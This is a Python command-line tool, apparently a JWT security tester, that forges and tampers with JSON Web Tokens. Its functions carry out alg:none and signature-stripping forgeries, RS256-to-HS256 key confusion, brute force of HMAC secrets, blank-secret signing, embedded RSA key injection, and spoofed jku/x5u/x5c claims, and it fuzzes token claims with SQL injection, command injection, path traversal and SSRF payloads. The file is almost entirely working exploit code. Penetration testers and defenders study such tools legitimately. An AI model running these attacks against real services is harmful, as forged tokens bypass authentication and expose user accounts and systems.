import argparse
import jwt
import json            
import re              
import base64    
from stoyled import *
from hmac import new as hmac
from hashlib import sha256
from sys import exit
from base64 import b64encode, b64decode
import time
import rsa
from Crypto.PublicKey import RSA
from ecdsa import SigningKey, NIST384p
from OpenSSL import crypto, SSL
from time import gmtime, mktime
import os


def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--token", help = "Specify your JWT using one of this parameters")
    parser.add_argument("-sec", "--secret", help = "Use this options for HS256, HS384, HS512 algorithms")
    parser.add_argument("-pub", "--public", help = "Specify path to a .txt file, which contains your public key")
    parser.add_argument("-priv", "--private", help = "Specify path to a .txt file, which contains your private key")
    parser.add_argument("-re", "--rsa-encode", help = "Pass algorithm type (RS256, RS384, RS512)")
    parser.add_argument("-he", "--hs-encode", help = "Pass algorithm type (HS256, HS384, HS512)")
    parser.add_argument("-p", "--payl", help = "Pass payload in a JSON format. For example, '\"user\":\"max\"'")
    parser.add_argument("-d", "--decode", action="store_true", help = "Use this parameter to decode JWT. Pass without value")
    parser.add_argument("-er", "--errors", action="store_true",help = "Use this parameter to try to cause some errors. Be aware that this can crash your website! Pass without value")
    parser.add_argument("-ss", "--sign-stripping", action="store_true",help = "Use this parameter to strip signing part of your token. Pass without value")
    parser.add_argument("-an", "--alg-none", action="store_true", help = "Use this parameter to change algorithm to 'none' in different formats. Pass without value")
    parser.add_argument("-pt", "--path-traversal", action="store_true" ,help = "Testing for Path Traversal. Its recommended to add more payloads to the path_traversal.txt file. Pass without value")
    parser.add_argument("-si", "--sqli", action="store_true", help = "Testing for SQL injection. Its recommended to add more payloads to the sqli.txt file. Pass without value")
    parser.add_argument("-os", "--osi", action="store_true", help = "Testing for Command injection. Its recommended to add more payloads to the osi.txt file. Pass without value")
    parser.add_argument("-rf", "--ssrf", action="store_true", help = "Testing for Server-Side Request Forgery. Its recommended to add more payloads to the ssrf.txt file. Pass without value")
    parser.add_argument("-bh", "--brute-hmac", action="store_true", help = "Dictionary attack on secret used in HMAC algorithm. Pass without value")
    parser.add_argument("-rh", "--rs-to-hmac", action="store_true", help = "Changing alghoritmh to HS***. Pass without value")
    parser.add_argument("-bp", "--blank-password", action="store_true", help = "Creating token with blank secret. Pass without value")
    parser.add_argument("-tt", "--timestamp-tampering", action="store_true", help = "Tampering with timestamps (exp, nbf, iat). Pass without value")
    parser.add_argument("-ki", "--key-injection", action="store_true", help = "Exploit Key injection vulnerabilty. Pass without value")
    parser.add_argument("-ks", "--key-size", help = "Key size for RSA generation. Default value 512. It is used in exploiting \"key injection\" vulnerability.")
    parser.add_argument("-rg", "--rsa-key-generation", action="store_true", help = "Generate keys for RSA algorithm. Pass without value")
    parser.add_argument("-eg", "--ecdsa-key-generation", action="store_true", help = "Generate keys for ECDSA algorithm. Pass without value")
    parser.add_argument("-k", "--kid", action="store_true", help = "Test kid claim. Pass without value")
    parser.add_argument("--jku", action="store_true", help = "Test jku claim. Pass without value")
    parser.add_argument("-u", "--url", help = "")
    parser.add_argument("--jti", action="store_true", help = "Test jti claim. Pass without value")
    parser.add_argument("--id", help = "Integer value for generating jti's value.")
    parser.add_argument("--x5u", action="store_true", help = "Test x5u claim. Pass without value")
    parser.add_argument("--x5c", action="store_true", help = "Test x5c claim. Pass without value")
    return parser.parse_args()

def base64_url_encode(payload):                     
    base64_payl = base64.b64encode(json.dumps(payload,separators=(",",":")).encode()).decode('UTF-8').strip("=")         
    return base64_payl

def hs_validation(token, header, headers, secret):
    decoded_jwt = jwt.decode(token, key=secret, algorithms=[header, ])
    print("\n", headers)
    print(decoded_jwt)    

def rs_validation(token, header, headers, public_key):
    decoded_jwt = jwt.decode(token, public_key, algorithms=[header, ])
    print("\n", headers)
    print(decoded_jwt)

def read_public_key(path_to_public_key):
    with open(path_to_public_key) as f:
        public_key = f.read()
        return public_key

def read_private_key(path_to_private_key):
    with open(path_to_private_key) as f:
        private_key = f.read()
        return private_key

def encode_using_rs(payload, private_key, header):
    payload = json.loads(payload)
    encoded_jwt = jwt.encode(payload, private_key, header)
    print("\n", str(encoded_jwt, 'utf-8'))                  

def encode_using_hs(payload, secret, header):
    payload = json.loads(payload)
    encoded_jwt = jwt.encode(payload, secret, header)
    print("\n", str(encoded_jwt, 'utf-8'))

def validateJSON(payload):
    try:
        json.loads(payload)
    except ValueError as err:
        return False
    return True

def show_me_errors(token):
    for x in range(4):
        token+="="
        print("\nTokens with 1-4 additional equal signs:\n", token)
    token = token.replace("====", "")
    token+="Asdgrm"
    print("\nToken with additional text at the end:\n", token)
    token = "Akjher" + token
    print("\nToken with additional text at the start and at the end:\n", token)
    token = token[6:-6]
    token+="%3C%3E"
    print("\nToken with bad characters at the end:\n", token)
    token = "%27" + token
    print("\nToken with bad characters at the start and at the end:\n", token)
    bad_token = token[3:-9]
    print("\nToken with reduced signature part:\n", bad_token)
    bad_token = token[6:-6]
    print("\nToken with reduced header part:\n", bad_token)

def signature_stripping(token):
    index = token.rfind(".")
    bad_token = token[:index]
    print(bad_token)
    bad_token = bad_token + "."
    print("\nToken with stripped signature with a dot at the end:\n\n", bad_token)

def alg_none(token, headers):
    algs = ["None", "none", "nOne", "noNe", "nonE", "NoNe", "NONE", "N0NE"]
    print("\nTokens with these alg types: \n[\"None\", \"none\", \"nOne\", \"noNe\", \"nonE\", \"NoNe\", \"NONE\", \"N0NE\"]")
    for x in algs:
        headers["alg"] = x
        head = base64_url_encode(headers)       
        index = token.find(".")
        token = token[index:]
        token = head + token
        print("\n", token)

def path_trav(token, key, header_alg):                                                        
    file_with_payloads = "path_traversal.txt"               
    with open(file_with_payloads) as f:                      
        payload = f.readlines()   
    index = token.find(".")
    names = ["iss", "sub", "aud", "exp", "kid", "jku", "jti", "user", "role", "Ahewa", "x5u", "x5c"]
    key = read_private_key(key)
    for i in range(0, len(names)):
        for y in payload:
            body = jwt.decode(token, options={"verify_signature": False})
            test = {names[i]:y.replace("\n","")}
            body.update(test)
            body = json.dumps(body)                 
            print("\n\n", names[i], " :: ", y)
            if header_alg == 'HS256' or header_alg == 'HS384' or header_alg == 'HS512':
                encode_using_hs(body, key, header_alg)
            elif header_alg == 'RS256' or header_alg == 'RS384' or header_alg == 'RS512':
                encode_using_rs(body, key, header_alg)
            else:
                exit("We encountered some problem with the name of your algorithm, please, recheck it, every space is important!")
            
def sqli(token, key, header_alg):                                                    
    file_with_payloads = "sqli.txt"                
    with open(file_with_payloads) as f:              
        payload = f.readlines()   
    index = token.find(".")
    names = ["iss", "sub", "aud", "exp", "kid", "jku", "jti", "user", "role", "Ahewa", "x5u", "x5c"]
    key = read_private_key(key)
    for i in range(0, len(names)):
        for y in payload:
            body = jwt.decode(token, options={"verify_signature": False})
            test = {names[i]:y.replace("\n","")}
            body.update(test)
            body = json.dumps(body)                 
            print("\n\n", names[i], " :: ", y)
            if header_alg == 'HS256' or header_alg == 'HS384' or header_alg == 'HS512':
                encode_using_hs(body, key, header_alg)
            elif header_alg == 'RS256' or header_alg == 'RS384' or header_alg == 'RS512':
                encode_using_rs(body, key, header_alg)
            else:
                exit("We encountered some problem with the name of your algorithm, please, recheck it, every space is important!")

def osi(token, key, header_alg):                                                     
    file_with_payloads = "osi.txt"                 
    with open(file_with_payloads) as f:             
        payload = f.readlines()   
    index = token.find(".")
    names = ["iss", "sub", "aud", "exp", "kid", "jku", "jti", "user", "role", "Ahewa", "x5u", "x5c"]
    key = read_private_key(key)
    for i in range(0, len(names)):
        for y in payload:
            body = jwt.decode(token, options={"verify_signature": False})
            test = {names[i]:y.replace("\n","")}
            body.update(test)
            body = json.dumps(body)                 
            print("\n\n", names[i], " :: ", y)
            if header_alg == 'HS256' or header_alg == 'HS384' or header_alg == 'HS512':
                encode_using_hs(body, key, header_alg)
            elif header_alg == 'RS256' or header_alg == 'RS384' or header_alg == 'RS512':
                encode_using_rs(body, key, header_alg)
            else:
                exit("We encountered some problem with the name of your algorithm, please, recheck it, every space is important!")

def ssrf(token, key, header_alg):                                                    
    file_with_payloads = "ssrf.txt"                 
    with open(file_with_payloads) as f:             
        payload = f.readlines()   
    index = token.find(".")
    names = ["iss", "sub", "aud", "exp", "kid", "jku", "jti", "user", "role", "Ahewa", "x5u", "x5c"]
    key = read_private_key(key)
    for i in range(0, len(names)):
        for y in payload:
            body = jwt.decode(token, options={"verify_signature": False})
            test = {names[i]:y.replace("\n","")}
            body.update(test)
            body = json.dumps(body)                 
            print("\n\n", names[i], " :: ", y)
            if header_alg == 'HS256' or header_alg == 'HS384' or header_alg == 'HS512':
                encode_using_hs(body, key, header_alg)
            elif header_alg == 'RS256' or header_alg == 'RS384' or header_alg == 'RS512':
                encode_using_rs(body, key, header_alg)
            else:
                exit("We encountered some problem with the name of your algorithm, please, recheck it, every space is important!")

def brute_hmac(token, header_alg):
    index = token.rfind(".")
    new_token = token[:index]
    new_token = new_token + "."

    body = jwt.decode(new_token, options={"verify_signature": False})
    body = json.dumps(body)

    with open("hmac_secrets.txt") as f:              
        hmac_secret = f.readlines()

    for key in hmac_secret:
        encode_using_hs(body, key, header_alg)              
                                
def rs_to_hmac(token, key):                                                                      
    header = jwt.get_unverified_header(token)
    header["alg"] = "HS256"
    header = str(json.dumps(header))
    base64header = b64encode(header.encode()).rstrip(b'=')

    payload = jwt.decode(token, options={"verify_signature": False})
    payload = str(json.dumps(payload))
    base64payload = b64encode(payload.encode()).rstrip(b'=')

    headerNpayload = base64header + b'.' + base64payload
    
    pubKey = open(key).read().encode()
    verifySig = hmac(pubKey, msg=headerNpayload, digestmod=sha256)
    verifySig = b64encode(verifySig.digest())
    verifySig = verifySig.replace(b'/', b'_').replace(b'+', b'-').strip(b'=')
    finaljwt = headerNpayload + b'.' + verifySig
    print(finaljwt.decode())

def blank_pass(token, header):
    secret = ""
    payload = jwt.decode(token, options={"verify_signature": False})
    payload = json.dumps(payload)
    encode_using_hs(payload, secret, header)

def timestamp_tampering(token, key, header_alg):
    # exp
    now = int( time.time() )                
    times = [now+1800, now-2]
    for i in times:
        test = {"exp": i}
        body = jwt.decode(token, options={"verify_signature": False})
        body.update(test)
        body = json.dumps(body)                 
        print("\nexp for the token:", i)
        if header_alg == 'HS256' or header_alg == 'HS384' or header_alg == 'HS512':
            encode_using_hs(body, key, header_alg)
        elif header_alg == 'RS256' or header_alg == 'RS384' or header_alg == 'RS512':
            key = read_private_key(key)
            encode_using_rs(body, key, header_alg)
        else:
            exit("We encountered some problem with the name of your algorithm, please, recheck it, every space is important!")

    # nbf
    times = [now-300, now+1800]
    for i in times:
        test = {"nbf": i}
        body = jwt.decode(token, options={"verify_signature": False})
        body.update(test)
        body = json.dumps(body)                 
        print("\nnbf for the token:", i)
        if header_alg == 'HS256' or header_alg == 'HS384' or header_alg == 'HS512':
            encode_using_hs(body, key, header_alg)
        elif header_alg == 'RS256' or header_alg == 'RS384' or header_alg == 'RS512':
            encode_using_rs(body, key, header_alg)
        else:
            exit("We encountered some problem with the name of your algorithm, please, recheck it, every space is important!")

    # iat
    times = [now-300, now+1800]
    for i in times:
        test = {"iat": i}
        body = jwt.decode(token, options={"verify_signature": False})
        body.update(test)
        body = json.dumps(body)                 
        print("\niat for the token:", i)
        if header_alg == 'HS256' or header_alg == 'HS384' or header_alg == 'HS512':
            encode_using_hs(body, key, header_alg)
        elif header_alg == 'RS256' or header_alg == 'RS384' or header_alg == 'RS512':
            encode_using_rs(body, key, header_alg)
        else:
            exit("We encountered some problem with the name of your algorithm, please, recheck it, every space is important!")

def key_injection(key_size, token):
    (public_key,private_key) = rsa.newkeys(512,poolsize=8)
    n=base64.urlsafe_b64encode(pack_big_int(public_key.n)).decode('utf-8').rstrip('=')
    e=base64.urlsafe_b64encode(pack_big_int(private_key.e)).decode('utf-8').rstrip('=')

    header = jwt.get_unverified_header(token)
    header = str(json.dumps(header))
    
    test = {"n": n,"e": e}
    
    body = jwt.decode(token, options={"verify_signature": False})
    body.update(test)
    body = json.dumps(body)
    
    base64_header = b64encode(header.encode()).rstrip(b'=')
    base64_body = b64encode(body.encode()).rstrip(b'=')
    base64_header_and_body = base64_header + b'.' + base64_body

    signature = rsa.sign(base64_header_and_body, private_key, 'SHA-256')
    base64_signature = base64.b64encode(signature)
    
    token = (base64_header_and_body + b'.' + base64_signature).decode('utf-8').rstrip("=")
    print(token)

def pack_big_int(byte):
    b = bytearray()
    while byte:
        b.append(byte & 0xFF)
        byte >>= 8
    return b[::-1]

def rsa_key_generation():
    key = RSA.generate(2048)
    public_key = key.publickey().exportKey("PEM")
    private_key = key.exportKey("PEM")
    print("\nPublic Key:\n", public_key.decode())
    print("\nPrivate Key:\n", private_key.decode())

def ecdsa_key_generation():
    sk = SigningKey.generate(curve=NIST384p)            
    print("\nPrivate Key:\n")
    print(sk.to_pem().decode())

    vk = sk.verifying_key
    print("\n\nPublic Key:\n")
    print(vk.to_pem().decode())

def kid(token, key, header_alg):
    print("\nIf the claim 'kid' is used, check web directory for that file or a variation of it. For example, if you are testing website 'example.com' and 'kid':'key/1' then look for 'https://example.com/key/1' or 'https://example.com/key/1.pem'.\n")
    index = token.find(".")
    key = read_private_key(key)
    files = ["path_traversal.txt", "sqli.txt", "osi.txt", "ssrf.txt"]
    name = "kid"
    for file in files:
        with open(file) as f:             
            payloads = f.readlines()
        print("\n\nPayloads from", file)
        for payload in payloads:
            body = jwt.decode(token, options={"verify_signature": False})
            test = {name:payload.replace("\n","")}
            body.update(test)
            body = json.dumps(body)                 
            print("\n\n", name, " :: ", payload)
            if header_alg == 'HS256' or header_alg == 'HS384' or header_alg == 'HS512':
                encode_using_hs(body, key, header_alg)
            elif header_alg == 'RS256' or header_alg == 'RS384' or header_alg == 'RS512':
                encode_using_rs(body, key, header_alg)
            else:
                exit("We encountered some problem with the name of your algorithm, please, recheck it, every space is important!")

def jku(token, key, header_alg, url):
    body = jwt.decode(token, options={"verify_signature": False})
    test = {"jku":url}
    body.update(test)
    body = json.dumps(body)
    key = read_private_key(key)
    print("\n\njku :: ", url)
    if header_alg == 'HS256' or header_alg == 'HS384' or header_alg == 'HS512':
        encode_using_hs(body, key, header_alg)
    elif header_alg == 'RS256' or header_alg == 'RS384' or header_alg == 'RS512':
        encode_using_rs(body, key, header_alg)
    else:
        exit("We encountered some problem with the name of your algorithm, please, recheck it, every space is important!")

def jti(token, identificator, key, header_alg):
    body = jwt.decode(token, options={"verify_signature": False})
    payl = {"jti":identificator}
    body.update(payl)
    body = json.dumps(body)
    key = read_private_key(key)
    print("\n\njti :: ", identificator)
    if header_alg == 'HS256' or header_alg == 'HS384' or header_alg == 'HS512':
        encode_using_hs(body, key, header_alg)
    elif header_alg == 'RS256' or header_alg == 'RS384' or header_alg == 'RS512':
        encode_using_rs(body, key, header_alg)
    else:
        exit("We encountered some problem with the name of your algorithm, please, recheck it, every space is important!")

def x5u(token, url, key, header_alg):                                                                       
    body = jwt.decode(token, options={"verify_signature": False})
    test = {"x5u":url}
    body.update(test)
    key = read_private_key(key)
    body = json.dumps(body)                 
    print("\nx5u :: ", url)
    if header_alg == 'HS256' or header_alg == 'HS384' or header_alg == 'HS512':
        encode_using_hs(body, key, header_alg)
    elif header_alg == 'RS256' or header_alg == 'RS384' or header_alg == 'RS512':
        encode_using_rs(body, key, header_alg)
    else:
        exit("We encountered some problem with the name of your algorithm, please, recheck it, every space is important!")
            
def x5c(token, header_alg):
    body = jwt.decode(token, options={"verify_signature": False})
    test = {"n": "MDBhNDhhN2VmMTQ5ZWZmYzg5ZDlhODA4MmQ2NTJlM2EzZmFkMmVjZmM3MDNlODY5NDZmMDJmNDViMjBhM2MwYjFmODE3MGYzMDJlZGEwZjc0Y2E5NzUzMGJkYTYzMWMzZGNiZThkMjVjZWM0ZGIzOGVhMjk5ZGY0YmNkNWU2MzI4OGQyZDFjZmNlNGJjN2ZlODUzMTI2YjU3NzU4OWFiZTZiNjg5ZGU5OWQyOWM2Yjg4YWJmYzRiMjFlOGM1YmMzYTE5YTJkMGI0ZmQ0NWU2ZjM5YTIyZDliNWQwNDIwOWI1NGIzMWJlYjIwOGFhZmUwZTkwMzljNjM3OTYzYjY4MTVkMDUxMmM3YWQyOGZhZTk2Zjg2MjFmMjhhNDM1MmNlZDIyY2Y3ODRjMjJjMTJlNzVjMGEyZDNjOTgxMDEzNGNkOWRkOWZkMTE1NjJjNDIzYTBlYmM5NTAzMGVmODNiNGZjNjUxMTk3YmQwZWNmNDlhZDE2YzNiZmEwZDk3MzM0ZmYwNjAwMDk4ZGYzNTgxOTIzMDgyMDkzNjY5MmU1N2I5NWQzOTlkNGFjMGNjZjI3ODQ5MmFjMDY3NTI2YzUyNTE0ZWI0MzA0YWI5NmQzYjdmZGZiNDkyM2MzM2ZmMmNlOWFlMjY3ZmU1YTQwOTRlMzEyNWQ3ZDM1NTg4NDRlZDFmMwo", "e": "MTAwMDEK", "x5c": "MIID8TCCAtmgAwIBAgIUZKKzMzrUTC4cvdCjwKEgUgAaqzMwDQYJKoZIhvcNAQELBQAwgYcxCzAJBgNVBAYTAlVLMQ8wDQYDVQQIDAZMb25kb24xDzANBgNVBAcMBkxvbmRvbjEQMA4GA1UECgwHQ29tcGFueTEQMA4GA1UECwwHU2VjdGlvbjENMAsGA1UEAwwETmFtZTEjMCEGCSqGSIb3DQEJARYUc2VjcmV0QHNlY3JldC5zZWNyZXQwHhcNMjIwNTAyMDkzNTEyWhcNMjQxMDE4MDkzNTEyWjCBhzELMAkGA1UEBhMCVUsxDzANBgNVBAgMBkxvbmRvbjEPMA0GA1UEBwwGTG9uZG9uMRAwDgYDVQQKDAdDb21wYW55MRAwDgYDVQQLDAdTZWN0aW9uMQ0wCwYDVQQDDAROYW1lMSMwIQYJKoZIhvcNAQkBFhRzZWNyZXRAc2VjcmV0LnNlY3JldDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAKSKfvFJ7/yJ2agILWUuOj+tLs/HA+hpRvAvRbIKPAsfgXDzAu2g90ypdTC9pjHD3L6NJc7E2zjqKZ30vNXmMojS0c/OS8f+hTEmtXdYmr5raJ3pnSnGuIq/xLIejFvDoZotC0/UXm85oi2bXQQgm1SzG+sgiq/g6QOcY3ljtoFdBRLHrSj66W+GIfKKQ1LO0iz3hMIsEudcCi08mBATTNndn9EVYsQjoOvJUDDvg7T8ZRGXvQ7PSa0Ww7+g2XM0/wYACY3zWBkjCCCTZpLle5XTmdSsDM8nhJKsBnUmxSUU60MEq5bTt/37SSPDP/LOmuJn/lpAlOMSXX01WIRO0fMCAwEAAaNTMFEwHQYDVR0OBBYEFLOQHM+wvaF7Ydql4X2caiGdhaumMB8GA1UdIwQYMBaAFLOQHM+wvaF7Ydql4X2caiGdhaumMA8GA1UdEwEB/wQFMAMBAf8wDQYJKoZIhvcNAQELBQADggEBAALCCFWb8tZm14NK8/tK5oFdvkFK7VjFTIYPeJcWkVaKZG92k1nVidd4v9ILPTlpIzxSx5LFFMnBt/STWCYdCcT128JDqUS8zdjuDaLG76nHbeJSEfGCRoimZErQMxOYMu5r6mzzYYu7TGYPKypJ4KcdqMRFn0ASzsY4unQq2fco+ETjLCFAX5NWn3MzuGGmP0QgbAnOm6o/nVNLA+rfnyLADW6z2BJYoqpWeXM5hr+DVemAe9uHTPzPx6fo4SkV3M8G+2pmKSuDuPWChYdCRbAte2omE4IZv8eqXbG8RYvxU6yD7PwFY/9Tl8fPkxgC8QbrYwXPTHWFwrYCHwB4Ti0=", "x5t": "MEY1NkE2MTM4Q0FGM0Q2NkQyMjQ1NzU4NEFFQTQ1OTRGRDE1NTM4NQ"}
    body.update(test)
    body = json.dumps(body)
    key = read_private_key("x5c/attack.key")
    if header_alg == 'RS256' or header_alg == 'RS384' or header_alg == 'RS512':
        encode_using_rs(body, key, header_alg)
    else:
        exit("We encountered some problem with the name of your algorithm!")

def main(args):
    print("""\n\n                                                   
    @@@ @@@  @@@  @@@ @@@@@@@                      
    @@! @@!  @@!  @@!   @!!                        
    !!@ @!!  !!@  @!@   @!!                        
.  .!!   !:  !!:  !!    !!:                        
::.::     ::.:  :::      :                         
                                                   
                                                   
@@@@@@@ @@@@@@@@  @@@@@@ @@@@@@@ @@@@@@@@ @@@@@@@  
  @!!   @@!      !@@       @!!   @@!      @@!  @@@ 
  @!!   @!!!:!    !@@!!    @!!   @!!!:!   @!@!!@!  
  !!:   !!:          !:!   !!:   !!:      !!: :!!  
   :    : :: ::  ::.: :     :    : :: ::   :   : : \n\n
                                                   """)

    if args.token is not None:
        token = args.token
        headers = jwt.get_unverified_header(token)          
        print("JWT headers:\n", headers)
        print("\nJWT payload:\n", jwt.decode(token, options={"verify_signature": False}))   
        print()
        header_alg = jwt.get_unverified_header(token)['alg']
    else:
        pass

    if args.public is not None:
        path_to_public_key = args.public
        print("\n[*] - Public key is processed!\n")

    if args.private is not None:
        path_to_private_key = args.private
        print("\n[*] - Private key is processed!\n")

    if args.payl is not None:
        payload = args.payl

    if args.rsa_encode is not None:                 
        header_alg = args.rsa_encode
        if validateJSON(payload):
            private_key = read_private_key(path_to_private_key)
            encode_using_rs(payload, private_key, header_alg)
        else:
            exit("Invalid JSON format of JWT payload.")

    if args.hs_encode is not None:                 
        if args.secret is not None:
            secret = args.secret
        else:
            exit("[Error!] - Please, specify for token validation")
        header_alg = args.hs_encode
        if validateJSON(payload):
            encode_using_hs(payload, secret, header_alg)
        else:
            exit("Invalid JSON format of JWT payload.")

    if args.decode is not False:                     

        if header_alg == 'HS256' or header_alg == 'HS384' or header_alg == 'HS512':
            if args.secret is not None:
                secret = args.secret
            else:
                exit("\n[Error!] - Please, specify secret for token validation")
            hs_validation(token, header_alg, headers, secret)
        elif header_alg == 'RS256' or header_alg == 'RS384' or header_alg == 'RS512':
            public_key = read_public_key(path_to_public_key)
            rs_validation(token, header_alg, headers, public_key)
        elif header_alg == 'ES256' or header_alg == 'ES384' or header_alg == 'ES512' or header_alg == 'PS256' or header_alg == 'PS384' or header_alg == 'PS512':
            exit("Unfortunately, current version does not support this algorithm")
        else:
            exit("We encountered some problem with the name of your algorithm, please, recheck it, every space is important!")
                       
    if args.errors is not False:                 
        print("\nBad formed tokens:\n")
        show_me_errors(token)

    if args.sign_stripping is not False:         
        print("\nToken with stripped signature without a dot at the end:\n")
        signature_stripping(token)

    if args.alg_none is not False:               
        alg_none(token, headers)

    if args.path_traversal is not False:
        if args.secret is not None:
            secret = args.secret
        elif args.private is not None:
            secret = args.private
        else:
            exit("[Error!] - Please, specify secret for creating token!")
        print("\nPayloads for path traversal:")
        path_trav(token, secret, header_alg)

    if args.sqli is not False:
        if args.secret is not None:
            secret = args.secret
        elif args.private is not None:
            secret = args.private
        else:
            exit("[Error!] - Please, specify secret for creating token!")
        print("\nPayloads for SQLi:")
        sqli(token, secret, header_alg)

    if args.osi is not False:
        if args.secret is not None:
            secret = args.secret
        elif args.private is not None:
            secret = args.private
        else:
            exit("[Error!] - Please, specify secret for creating token!")
        print("\nPayloads for OSi:")
        osi(token, secret, header_alg)

    if args.ssrf is not False:
        if args.secret is not None:
            secret = args.secret
        elif args.private is not None:
            secret = args.private
        else:
            exit("[Error!] - Please, specify secret for creating token!")
        print("\nPayloads for SSRF:")
        ssrf(token, secret, header_alg)

    if args.brute_hmac is not False:
        brute_hmac(token, header_alg)

    if args.rs_to_hmac is not False:
        rs_to_hmac(token, path_to_public_key)

    if args.blank_password is not False:
        blank_pass(token, header_alg)

    if args.timestamp_tampering is not False:
        if args.secret is not None:
            key = args.secret
        elif args.private is not None:
            key = args.private
        else:
            exit("[Error!] - Please, specify secret for creating token!")
        print("\nexp claim. The first token has one hour to live, the second one is outdated!\nnbf claim. The value equals current time - 300 sec (it must work fine) and the second value equals to current time + 1800 sec (it shoudnt work!).\niat claim. Values are the same as values for previous claim. First token must work fine, second should fail!")
        print("\nPayloads for timestamp tampering:")
        timestamp_tampering(token, key, header_alg)
    
    if args.key_injection is not False:
        if args.key_size is not None:
            rsa_key = int(args.key_size)
        else:
            rsa_key = 512
        key_injection(rsa_key, token)

    if args.ecdsa_key_generation is not False:   
        ecdsa_key_generation()

    if args.rsa_key_generation is not False:   
        rsa_key_generation()

    if args.kid is not False:
        if args.secret is not None:
            secret = args.secret
        elif args.private is not None:
            secret = args.private
        else:
            exit("[Error!] - Please, specify secret for creating token!")
        print("\n\nPayloads for testing 'kid' parameter:")
        kid(token, secret, header_alg)

    if args.jku is not False:
        if args.secret is not None:
            secret = args.secret
        elif args.private is not None:
            secret = args.private
        else:
            exit("[Error!] - Please, specify secret for creating token!")
        if args.url is not None:
            address = args.url
            jku(token, secret, header_alg, address)
        else:
            print("\n\nYou can provide url using '-u' parameter and we will change jku's value to your address, this way you can use your Public key to verify token.(Can also lead to SSRF attack!) If it doesnt work, you can check url from the token, there must be the JWKS file with the Public key. ")

    if args.jti is not False:
        if args.secret is not None:
            secret = args.secret
        elif args.private is not None:
            secret = args.private
        else:
            exit("\n[Error!] - Please, specify secret for creating token!")
        if args.id is not None:
            identificator = args.id
            jti(token, identificator, secret, header_alg)
        else:
            exit("\n[Error!] - Please, provide id number for jti claim!")

    if args.x5u is not False:
        if args.private is not None:
            secret = args.private
        else:
            exit("\n[Error!] - Please, specify secret for creating token!")
        if args.url is not None:
            address = args.url
        else:
            exit("\n[Error!] - Please, provide URL for x5u claim!")
        print("\nTo exploit this claim you have default folder 'x5u' with everything you need, but you can change file 'private.pem' as you want.\nAlso do not forget to run a server with global accessible ip address, upload the certificate from the default folder to some path and provide its URL using -u or --url parameter!\nThis claim can be vulnerable to SSRF too!")
        x5u(token, address, secret, header_alg)

    if args.x5c is not False:
        print("\nTo exploit this claim you have default values! If you want to change something, follow this guide: https://blog.pentesteracademy.com/hacking-jwt-tokens-x5c-claim-misuse-4b8582281db1 ")
        x5c(token, header_alg)

main(parse_args())
